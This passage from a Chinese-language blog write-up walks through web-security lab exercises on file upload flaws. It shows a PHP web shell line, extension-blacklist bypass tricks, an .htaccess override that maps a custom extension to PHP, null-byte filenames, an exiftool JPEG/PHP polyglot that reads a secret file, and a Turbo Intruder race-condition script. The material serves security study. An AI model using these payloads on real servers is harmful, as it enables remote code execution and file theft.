<p><img src="/posts/34bab347//image-20250430123852944.png" alt="image-20250430123852944"></p>
<ol start="2">
<li class="lvl-3">
<p>将Content-Type修改为符合规定的内容，php代码不变，即可上传成功</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430123908753.png" alt="image-20250430123908753"></p>
<ol start="3">
<li class="lvl-3">
<p>访问账户的头像通关</p>
</li>
</ol>
<p><img src="/posts/34bab347//image-20250430123725160.png" alt="image-20250430123725160"></p>
<p>总结：前端防护，限制上传的文件类型，通过Burp Suitte 修改文件名绕过检测。后端无防护，服务器具备执行条件。</p>
<h3 id="防止在用户可访问的目录中执行文件">防止在用户可访问的目录中执行文件</h3>
<p>虽然从一开始就防止上传危险文件类型显然更好，但第二道防线阻止服务器执行任何漏网脚本。</p>
<p>为谨慎起见，服务器通常只运行其 MIME 类型已明确配置为可执行的脚本。否则，它们可能只会返回某种错误信息，或者在某些情况下，以纯文本形式提供文件内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /static/exploit.php?command=<span class="built_in">id</span> HTTP/<span class="number">1.1</span></span><br><span class="line">    Host: normal-website.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">    Content-<span class="type">Type</span>: text/plain</span><br><span class="line">    Content-Length: <span class="number">39</span></span><br><span class="line"></span><br><span class="line">    &lt;?php echo system($_GET[<span class="string">&#x27;command&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></figure>
<p>这种行为本身可能很有趣，因为它提供了一种泄漏源代码的方法，但它使任何创建网络 shell 的尝试都化为乌有。</p>
<p>这种配置通常因目录而异。上传用户提供文件的目录可能比文件系统中其他位置的控制要严格得多，因为其他位置被认为是最终用户无法访问的。如果你能找到一种方法，将脚本上传到另一个不应该包含用户提供文件的目录，那么服务器终究可能会执行你的脚本。</p>
<p><font class="notice">注意：网络服务器通常使用<code>multipart/form-data</code>请求中的文件名字段来确定文件的名称和保存位置。</font></p>
<h4 id="Lab：通过路径遍历上传网络-shell">Lab：通过路径遍历上传网络 shell</h4>
<p>该实验室包含一个易受攻击的图片上传功能。服务器被配置为防止执行用户提供的文件，但可通过利用次要漏洞（文件路径遍历）绕过此限制。要解决该实验问题，请上传一个基本的 <code>PHP web shell</code>，并使用它来外泄文件 <code>/home/carlos/secret</code> 的内容。使用实验室横幅中提供的按钮提交此秘密。您可以使用以下凭据登录自己的账户： <code>wiener:peter</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>按照以往的方式访问自己上传的php代码，服务器直接将php代码以文本方式返回</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250430183245601.png" alt="image-20250430183245601"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>修改<code>filename</code>目录遍历语句被服务器清理</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250430183451599.png" alt="image-20250430183451599"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用url编码上传成功</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250430183708967.png" alt="image-20250430183708967"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>访问即可</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250430183739696.png" alt="image-20250430183739696"></p>
<p>您还应注意，尽管您可能会将所有请求发送到同一域名，但这通常指向某种反向代理服务器，如负载平衡器。您的请求通常会由其他服务器在幕后处理，这些服务器的配置也可能不同。</p>
<h3 id="危险文件类型黑名单不足">危险文件类型黑名单不足</h3>
<p>防止用户上传恶意脚本的一个比较明显的方法是将 <code>.php</code>  等潜在危险的文件扩展名列入黑名单。黑名单的做法本质上是有缺陷的，因为很难明确阻止每一个可能用于执行代码的文件扩展名。有时可以通过使用较不知名的、仍可执行的替代文件扩展名（如 <code>.php5</code>、<code>.shtml</code> 等）来绕过此类黑名单。针对这种防护，可以尝试以下几种方式进行绕过：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用不常见的后缀名：<code>php5,pht,phpt,phtml,php3,php4,php5,php6</code></p>
</li>
<li class="lvl-2">
<p>使用大小写：<code>.pHp</code></p>
</li>
<li class="lvl-2">
<p>重写服务器配置文件：apache的<code>.htaccess</code>或者IIS的<code>web.config</code></p>
</li>
<li class="lvl-2">
<p>使用多扩展名，譬如<code>example.php.jpg</code>，这种方式依赖于服务器如何解析文件，如果服务器<strong>从前往后解析，并且解析到第一个扩展名就停止解析</strong>，则该文件会被当作<code>example.php</code>存储</p>
</li>
<li class="lvl-2">
<p>添加尾随字符，有些组件可能会过滤或忽视文件名末尾的空格或小数点，譬如<code>example.php.</code>或<code>example.php </code> (末尾有一个空格)</p>
</li>
<li class="lvl-2">
<p>尝试使用url编码，譬如：<code>example%2ephp</code></p>
</li>
<li class="lvl-2">
<p>再文件扩展名前添加分号或者url编码的空字符，譬如：<code>example.php;jpg</code>或<code>example.php%00.jpg</code></p>
</li>
<li class="lvl-2">
<p>使用多字节Unicode字符，譬如Unicode字符序列：<code>xC0 xAE</code>，<code>xC4 xAE</code>，<code>xC0 x2E</code>再utf-8编码下可能转化为<code>x2E</code>，然后转化为ASCII字符使用</p>
</li>
</ul>
<h4 id="覆盖服务器配置">覆盖服务器配置</h4>
<p>正如我们在上一节所讨论的，除非经过配置，否则服务器通常不会执行文件。例如，若允许 Apache 服务器执行客户端请求的 PHP 文件，开发人员需要在 <code>/etc/apache2/apache2.conf</code> 文件中添加以下指令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LoadModule php_module /usr/lib/apache2/modules/libphp.so</span><br><span class="line">    AddType application/x-httpd-php .php</span><br></pre></td></tr></table></figure>
<p>许多服务器还允许开发人员在个别目录中创建特殊配置文件，以覆盖或添加一个或多个全局设置。例如，Apache 服务器会从名为 <code>.htaccess</code> 的文件中加载特定目录的配置（如果有的话）。</p>
<p>同样，开发人员可以使用 <code>web.config</code> 文件对 IIS 服务器进行特定目录配置。这可能包括以下指令，在本例中，这些指令允许向用户提供 JSON 文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">staticContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mimeMap</span> <span class="attr">fileExtension</span>=<span class="string">&quot;.json&quot;</span> <span class="attr">mimeType</span>=<span class="string">&quot;application/json&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">staticContent</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>网络服务器会使用这类配置文件，但通常不允许使用 HTTP 请求访问它们。不过，你偶尔会发现服务器无法阻止你上传自己的恶意配置文件。在这种情况下，即使你需要的文件扩展名被列入了黑名单，你也可以欺骗服务器将任意的自定义文件扩展名映射到可执行的 MIME 类型。</p>
<h5 id="Lab：通过扩展黑名单绕过网络外壳上传">Lab：通过扩展黑名单绕过网络外壳上传</h5>
<p>本实验室包含一个易受攻击的图片上传功能。某些文件扩展名被列入了黑名单，但由于该黑名单配置中的一个基本缺陷，这一防御可被绕过。要解决该实验问题，请上传一个基本的 PHP web shell，然后使用它渗出文件 /home/carlos/secret 的内容。使用实验横幅中提供的按钮提交此秘密。您可以使用以下凭据登录自己的账户：wiener:peter。</p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        Hint
    </div>
    <div class="spoiler-content">
        <p>You need to upload two different files to solve this lab.</p>

    </div>
</div>
<ul class="lvl-0">
<li class="lvl-2">
<p>直接上传php文件失败，服务采用了黑名单防护机制</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505174128331.png" alt="image-20250505174128331"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>尝试上传Apache的配置文件<code>htaccess</code>，将文件扩展名 <strong><code>.l33t</code></strong> 关联到PHP解析器，，提醒上传成功</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505174603001.png" alt="image-20250505174603001"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>再试上传恶意文件成功</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505175302956.png" alt="image-20250505175302956"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>访问即可获得密码</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505175433671.png" alt="image-20250505175433671"></p>
<p><strong>代码解释：</strong></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .l33t</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>AddType</code></strong>：Apache指令，用于将特定文件扩展名映射到对应的MIME类型。</p>
</li>
<li class="lvl-2">
<p><strong><code>application/x-httpd-php</code></strong>：PHP脚本的MIME类型，告诉服务器使用PHP解析器处理该文件。</p>
</li>
<li class="lvl-2">
<p><strong><code>.l33t</code></strong>：自定义的文件扩展名（通常用于替代常见的 <code>.php</code>）。</p>
</li>
</ul>
<p><strong>作用：</strong></p>
<ol>
<li class="lvl-3">
<p><strong>PHP解析</strong>：所有以 <code>.l33t</code> 结尾的文件会被Apache视为PHP脚本，<strong>其中的PHP代码会被服务器解析执行</strong>。</p>
</li>
<li class="lvl-3">
<p><strong>隐藏技术栈</strong>：通过非标准扩展名（如 <code>.l33t</code>）隐藏网站使用的PHP技术，增加攻击者识别难度（但实际安全提升有限，需配合其他措施）。</p>
</li>
</ol>
<h4 id="混淆文件扩展名">混淆文件扩展名</h4>
<p>即使是最详尽的黑名单，也有可能被经典的混淆技术绕过。假设验证代码对大小写敏感，无法识别 exploit.pHp 实际上是 .php  文件。如果随后将文件扩展名映射到 MIME 类型的代码对大小写不敏感，这种差异就会使恶意 PHP 文件偷偷通过验证，最终被服务器执行。</p>
<p>您还可以使用以下技术实现类似的效果：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>提供多种扩展名。根据解析文件名所使用的算法，以下文件可能被解释为 PHP 文件或 JPG 图像：exploit.php.jpg</p>
</li>
<li class="lvl-2">
<p>添加尾部字符。某些组件会删除或忽略尾部空格、点等类似字符： exploit.php.jpg。</p>
</li>
<li class="lvl-2">
<p>尝试使用 URL 编码（或双 URL 编码）来处理点、正斜线和反斜线。如果在验证文件扩展名时未对该值进行解码，但随后在服务器端进行了解码，这样也可以上传恶意文件，否则会被阻止： exploit%2Ephp在文件扩展名前添加分号或 URL 编码的空字节字符。</p>
</li>
<li class="lvl-2">
<p>如果验证是用 PHP 或 Java 等高级语言编写的，但服务器使用 C/C++  等低级函数处理文件，这可能会导致文件名末尾的处理不一致：exploit.asp;.jpg 或 exploit.asp%00.jpg尝试使用多字节 unicode 字符，这些字符可能在 unicode 转换或规范化后被转换为空字节和点。</p>
</li>
<li class="lvl-2">
<p>如果文件名被解析为 UTF-8 字符串，xC0  x2E、xC4 xAE 或 xC0 xAE 等序列可能会被转换为 x2E，但在路径中使用前又会被转换为 ASCII 字符。</p>
</li>
</ul>
<p>其他防御措施包括删除或替换危险的扩展名，以防止文件被执行。如果这种转换不是递归应用的，你可以将禁止的字符串定位在这样一种方式，即删除它仍然会留下一个有效的文件扩展名。例如，如果从以下文件名中删除 .php 会发生什么情况：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">exploit<span class="selector-class">.p</span>.phphp</span><br></pre></td></tr></table></figure>
<p>这只是混淆文件扩展名的众多方法中的一小部分。</p>
<h5 id="Lab：通过混淆文件扩展名上传网络外壳">Lab：通过混淆文件扩展名上传网络外壳</h5>
<p>该实验室包含一个易受攻击的图片上传功能。某些文件扩展名被列入了黑名单，但可以使用经典的混淆技术绕过这一防御。要解决该实验问题，请上传一个基本的 PHP web shell，然后用它来外泄文件 /home/carlos/secret 的内容。使用实验室横幅中提供的按钮提交此秘密。您可以使用以下凭据登录自己的账户：wiener:peter</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>直接上传失败，提示只能传JPG和PNG</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505184603898.png" alt="image-20250505184603898"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><s>啊，这就过啦</s>   添加后缀，文件的后缀并没有变，考虑添加空字节</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505184818551.png" alt="image-20250505184818551"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>这就可以了</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505214317371.png" alt="image-20250505214317371"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>访问就可以得到密码</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250505214506196.png" alt="image-20250505214506196"></p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        补充
    </div>
    <div class="spoiler-content">
        <ul class="lvl-0">
<li class="lvl-2">
<p><code>%00</code> 是 <strong>URL编码的空字符（Null Character）</strong>，对应 ASCII 码中的 <code>0x00</code>。它在计算机系统中通常表示字符串的<strong>结束符</strong>，但在不同场景下可能引发安全问题或功能异常。</p>
</li>
<li class="lvl-2">
<p>旧版PHP（5.3之前）存在空字节阶段漏洞，PHP&gt;=5.3版本中已将其修复</p>
</li>
<li class="lvl-2">
<p>如 PHP 的 <code>basename()</code> 会自动过滤空字符。</p>
</li>
<li class="lvl-2">
<p>在路径遍历在也可以利用 <code>%00</code> 截断路径，访问非授权文件（如 <code>../../secret.log%00</code>）。</p>
</li>
<li class="lvl-2">
<p>大多数 Web 服务器并不是在一开始安装成功后就能执行文件的，像 Apache，要执行 PHP 脚本，需要在 <code>/etc/apache2/apache2.conf</code> 配置文件中添加如下指令加载 php 模块，以及当访问后缀名为 <code>.php</code> 的文件时，作为 php 脚本执行。：</p>
</li>
</ul>
<blockquote>
<p>LoadModule php_module /usr/lib/apache2/modules/libphp.so<br>
AddType application/x-httpd-php .php</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>不止 Apache，Nginx 和 IIS 也都是要做一些配置才能执行脚本。</p>
<ul class="lvl-2">
<li class="lvl-4">
<p>除了 apache2.conf 这个系统级的配置文件，Apache 服务器允许在每个目录下放置一个 <code>.htaccess</code> 文件，在该文件中添加的指令可以覆盖和补充 apache2.conf 的配置。如果应用程序允许上传 <code>.htaccess</code> ，那么就能利用它绕过安全防护，执行代码。</p>
</li>
<li class="lvl-4">
<p>IIS 服务器也有一个类似的配置文件，名为 <code>web.config</code>，它的指令示例：</p>
<ul class="lvl-4">
<li class="lvl-6">
<p>//.json 文件被当成 json 发送给客户端。</p>
<blockquote>
<staticContent>
    <mimeMap fileextension=".json" mimetype="application/json">
    </mimeMap></staticContent>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>

    </div>
</div>
<h3 id="文件内容验证存在缺陷">文件内容验证存在缺陷</h3>
<p>更安全的服务器会尝试验证文件内容是否与预期相符，而不是隐含地信任请求中指定的 <code>Content-Type</code>。</p>
<p>在图像上传功能中，服务器可能会尝试验证图像的某些固有属性，如尺寸。例如，如果您尝试上传一个 PHP 脚本，它根本不会有任何尺寸。因此，服务器会推断它不可能是图像，并相应地拒绝上传。</p>
<p>同样，某些文件类型的页眉或页脚可能总是包含特定的字节序列。这些序列就像指纹或签名一样，可用于确定文件内容是否与预期类型相符。例如，JPEG 文件总是以 <code>FF D8 FF</code> 字节开始。</p>
<p>这是验证文件类型的一种更稳健的方法，但即便如此也并非万无一失。使用 ExifTool 等特殊工具（Exiftool 工具在 kali 系统中已默认安装），可以轻而易举地创建一个在元数据中包含恶意代码的多格式 JPEG 文件。</p>
<h4 id="Lab-通过多语言网络外壳上传远程执行代码">Lab: 通过多语言网络外壳上传远程执行代码</h4>
<p>本实验室包含一个易受攻击的图片上传功能。虽然它会检查文件内容以验证其是否为真正的图片，但仍有可能上传并执行服务器端代码。要解决该实验问题，请上传一个基本的 PHP web shell，然后用它来外泄文件 /home/carlos/secret 的内容。使用实验室横幅中提供的按钮提交此秘密。您可以使用以下凭据登录自己的账户：wiener:peter</p>
<p>这道题web应用对上传的文件头做了校验，如果没有识别到预期的特征码就会报错，这种情况下，可以通过exiftool或其他工具来修改文件元数据，插入脚本生成多态jpeg文件进行绕过 exiftool命令：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>不管是直接上传php脚本，还是尝试其他在之前实验室里用过的技术都已经不行了。</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250506154133865.png" alt="image-20250506154133865"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>创建一个多语 PHP/JPG 文件，该文件从根本上说是一个普通图像，但在元数据中包含了 PHP 有效载荷。一种简单的方法是下载并从命令行运行 ExifTool，将 PHP 有效载荷添加到图片的注释字段，以 .php 扩展名保存图片，然后上传。如下所示：</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exiftool -Comment=<span class="string">&quot;&lt;?php echo &#x27;START &#x27; . file_get_contents(&#x27;/home/carlos/secret&#x27;) . &#x27; END&#x27;; ?&gt;&quot;</span> NiuBi.jpg -o polyglot.php</span><br></pre></td></tr></table></figure>
<p><img src="/posts/34bab347//image-20250506160513314.png" alt="image-20250506160513314"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>将<code>polyglot</code> 上传</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250506160911322.png" alt="image-20250506160911322"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><s>访问就行啦</s>   我靠咋不行，网上的都是jpg，应该是文件格式的问题吧，再用jpg试一下</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250506163353446.png" alt="image-20250506163353446"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>果然可以了。。。网络的世界真是奇妙</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250506163844566.png" alt="image-20250506163844566"></p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        补充
    </div>
    <div class="spoiler-content">
        <ul class="lvl-0">
<li class="lvl-2">
<p>exiftool命令的含义</p>
<ul class="lvl-2">
<li class="lvl-4"><strong><code>exiftool</code></strong>：一个用于读写文件元数据（如EXIF信息）的命令行工具，常用于处理图片的拍摄参数、注释等。</li>
<li class="lvl-4"><strong><code>-Comment=&quot;&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;&quot;</code></strong>
<ul class="lvl-4">
<li class="lvl-6">将JPEG图片的**注释字段（Comment）**修改为一段PHP代码。</li>
<li class="lvl-6">代码功能：读取服务器上**<code>/home/carlos/secret</code>**文件的内容，并包裹在<code>START</code>和<code>END</code>之间输出。</li>
</ul>
</li>
<li class="lvl-4"><strong><code>-o polyglot.php</code>：<strong>将处理后的文件输出为</strong><code>polyglot.php</code></strong>。生成的文件既是合法图片（保留原JPEG数据），又是PHP脚本（因扩展名为<code>.php</code>且包含可执行代码）。</li>
</ul>
</li>
<li class="lvl-2">
<p>此题上传的文件为 <code>polyglot.php</code> ，当然大部分服务器是不能上传php文件的，但是如果能采用某些方法将jpg解析为php，这段代码依然是可以执行的</p>
</li>
</ul>

    </div>
</div>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        为什么上传png会失败
    </div>
    <div class="spoiler-content">
        <ol>
<li class="lvl-3">
<p><strong>元数据结构的本质差异</strong>：</p>
<ul class="lvl-2">
<li class="lvl-5"><strong>JPG（JPEG）</strong>：使用 <strong>EXIF 标准</strong>存储元数据，允许直接将PHP代码写入<code>Comment</code>字段。ExifTool修改后，文件仍保持有效的JPEG结构，同时代码位于可被PHP解析的位置。</li>
<li class="lvl-5"><strong>PNG</strong>：元数据存储在 <strong>“数据块”（Chunks）</strong> 中（如<code>tEXt</code>、<code>iTXt</code>等）。直接通过<code>-Comment</code>参数注入代码可能破坏PNG文件结构，或代码未存储在服务器会解析的位置。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>PHP执行逻辑的差异</strong>：</p>
<ul class="lvl-2">
<li class="lvl-5">即使成功注入代码到PNG中，PHP解析器可能不会执行位于PNG数据块中的代码，因为PHP默认从文件开头解析，遇到非PHP标签（如PNG的二进制头<code>‰PNG</code>）会直接终止执行。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>服务器对文件扩展名的处理</strong>：</p>
<ul class="lvl-2">
<li class="lvl-5">如果上传的PNG文件保留<code>.png</code>扩展名，服务器可能不会调用PHP解析器，即使内容包含PHP代码。而<code>.php</code>扩展名的文件（如你生成的<code>polyglot.php</code>）会被强制用PHP解析。</li>
</ul>
</li>
<li class="lvl-3">
<p>我按照deepseek给我的方法用png进行了尝试，依然失败了。首先我的PHP代码没能写进去（检查时发现的），然后服务端依然没能解析后缀php的png图片。感觉png的安全性应该是比jpg高的。</p>
</li>
<li class="lvl-3">
<p><strong>总的来说：</strong></p>
<ul class="lvl-2">
<li class="lvl-5"><strong>JPG成功</strong>：因其元数据允许直接注入PHP代码，且生成文件扩展名为<code>.php</code>触发服务器解析。</li>
<li class="lvl-5"><strong>PNG失败</strong>：元数据存储方式不同，且默认扩展名（<code>.png</code>）不触发PHP解析。需调整注入位置或文件结构才能成功。</li>
</ul>
</li>
</ol>

    </div>
</div>
<h3 id="利用文件上传竞赛条件">利用文件上传竞赛条件</h3>
<p>现代框架对此类攻击的防御能力更强。它们通常不会直接将文件上传到文件系统上的目标位置。相反，它们会采取一些预防措施，比如先上传至一个临时的沙盒目录，并随机化名称以避免覆盖现有文件。然后，它们对临时文件进行验证，只有在认为安全后才将文件传输到目的地。</p>
<p>尽管如此，开发人员有时会独立于任何框架实现自己的文件上传处理。要做好这一点不仅相当复杂，还可能引入危险的竞赛条件，使攻击者能够完全绕过最强大的验证。</p>
<p>例如，有些网站会将文件直接上传到主文件系统，如果没有通过验证，就会再次删除。这种行为在依赖反病毒软件等检查恶意软件的网站中非常典型。这可能只需要几毫秒，但在文件存在于服务器上的短时间内，攻击者仍有可能执行该文件。</p>
<p>这些漏洞往往非常隐蔽，因此很难在黑盒测试中发现，除非你能找到泄露相关源代码的方法。</p>
<p>总的来说啊就是：很多文件上传功能不会先将上传的文件上传到目标位置，而是先送去沙盒化临时目录做检查，并随机化它的名称，看看他是不是恶意文件，然后再传到最终目录。但是有的开发者比较疏忽，把文件传到自己的框架目录对它检查。虽然检查的时间很短，但是黑客依然可能利用短短的几毫秒时间搞事情。</p>
<p>另外，还有一种情况可能发生条件竞争文件上传漏洞，就是让用户提供一个 URL 来保存文件，这一般只能由开发人员自己编写处理程序，也必须先下载一份文件副本到本地，然后再做安全性验证，所以这种情况很容易出现漏洞。如果上传的文件或通过 URL 下载的文件保存到一个具有随机名称的临时目录，这一般不太可能被攻击者知道，但如果临时目录是伪随机数，那么仍然有可能被攻击者用暴力破解的方法知道。</p>
<p>为了让条件竞争上传文件的攻击更容易，攻击者会上传一个恶意的大文件，里面填充大量无用字符，但不会影响到里面的代码被执行，应用程序处理这类大文件会处理得更久，那么文件在文件系统上停留的时间更久，也就更容易被攻击者趁机访问。</p>
<h4 id="Lab：-通过竞赛条件上传网络外壳">Lab： 通过竞赛条件上传网络外壳</h4>
<p>该实验室包含一个易受攻击的图片上传功能。虽然它对上传的任何文件都执行了稳健的验证，但利用其处理文件方式中的竞赛条件，完全可以绕过验证。引入这一竞赛条件的脆弱代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//存储目标文件夹名 &#x27;avatars/&#x27;</span></span><br><span class="line"><span class="variable">$target_dir</span> = <span class="string">&quot;avatars/&quot;</span>;</span><br><span class="line"><span class="comment">//$target_file 是最终保存文件的路径。</span></span><br><span class="line"><span class="comment">//$_FILES[&quot;avatar&quot;][&quot;name&quot;] 是用户上传文件的原始名字（比如用户上传的文件叫 cat.jpg，这里就是 cat.jpg）。</span></span><br><span class="line"><span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;avatar&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// temporary move</span></span><br><span class="line"><span class="comment">//$_FILES[&quot;avatar&quot;][&quot;tmp_name&quot;] 是文件上传到服务器后的临时存储路径（比如 &#x27;/tmp/php123.tmp&#x27;）。</span></span><br><span class="line"><span class="comment">//move_uploaded_file 的作用是将临时文件移动到目标路径 $target_file。</span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;avatar&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果文件通过了病毒检查(checkViruses)和文件类型检查(checkFileType)，显示上传成功；否则删除文件，显示错误。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">checkViruses</span>(<span class="variable">$target_file</span>) &amp;&amp; <span class="title function_ invoke__">checkFileType</span>(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="comment">//htmlspecialchars：防止文件名中的特殊字符引发安全问题（比如 &lt;script&gt; 这类代码）。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span>. <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$target_file</span>). <span class="string">&quot; has been uploaded.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_file</span>);<span class="comment">//删除文件。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);<span class="comment">//返回“禁止访问”的状态码。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkViruses</span>(<span class="params"><span class="variable">$fileName</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// checking for viruses</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查文件扩展名（后缀）是否是 jpg 或 png。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFileType</span>(<span class="params"><span class="variable">$fileName</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//pathinfo($fileName, PATHINFO_EXTENSION)：提取文件名的后缀（比如 cat.jpg 提取出 jpg）。</span></span><br><span class="line">    <span class="comment">//strtolower：将后缀转为小写（防止 JPG 和 jpg 不一致）。</span></span><br><span class="line">    <span class="variable">$imageFileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>,PATHINFO_EXTENSION));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$imageFileType</span> != <span class="string">&quot;jpg&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;png&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, only JPG &amp; PNG files are allowed\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><font class="notice">注：我php太菜，直接上注释了</font></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>首先上传图片，然后添加路径访问图片，确保访问路径正确</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250507101849368.png" alt="image-20250507101849368"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>然后构造Tburbo Intruder文件上传竞赛脚本进行攻击，脚本如下</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=<span class="number">10</span>,)</span><br><span class="line"></span><br><span class="line">    request1 = <span class="string">&#x27;&#x27;&#x27;&lt;YOUR-POST-REQUEST&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    request2 = <span class="string">&#x27;&#x27;&#x27;&lt;YOUR-GET-REQUEST&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the &#x27;gate&#x27; argument blocks the final byte of each request until openGate is invoked</span></span><br><span class="line">    engine.queue(request1, gate=<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        engine.queue(request2, gate=<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wait until every &#x27;race1&#x27; tagged request is ready</span></span><br><span class="line">    <span class="comment"># then send the final byte of each request</span></span><br><span class="line">    <span class="comment"># (this method is non-blocking, just like queue)</span></span><br><span class="line">    engine.openGate(<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    engine.complete(timeout=<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    table.add(req)</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>将request1设置为上传php代码的包，将request2设置为上传的php代码的路径。</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250507102639395.png" alt="image-20250507102639395"></p>
<h4 id="基于-URL-的文件上传中的竞赛条件">基于 URL 的文件上传中的竞赛条件</h4>
